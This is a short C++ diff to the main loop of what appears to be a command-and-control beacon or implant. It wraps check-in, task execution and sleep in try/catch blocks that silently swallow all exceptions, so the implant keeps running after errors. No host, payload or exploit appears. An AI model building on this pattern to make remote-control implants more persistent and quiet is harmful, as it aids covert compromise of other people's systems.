@@ -20,11 +20,22 @@ int main(int argc, char* argv[])
 	bool exit = false;
 	while (!exit)
 	{
-		beacon->checkIn();
+		try 
+		{
+			beacon->checkIn();
 
-		exit = beacon->runTasks();
-		
-		beacon->sleep();
+			exit = beacon->runTasks();
+			
+			beacon->sleep();
+		}
+		catch(const std::exception& ex)
+		{
+			// std::cout << "Exeption " << ex.what() << std::endl;
+		}
+		catch (...) 
+		{
+			// std::cout << "Exeption" << std::endl;
+		}
 	}
 
 	beacon->checkIn();
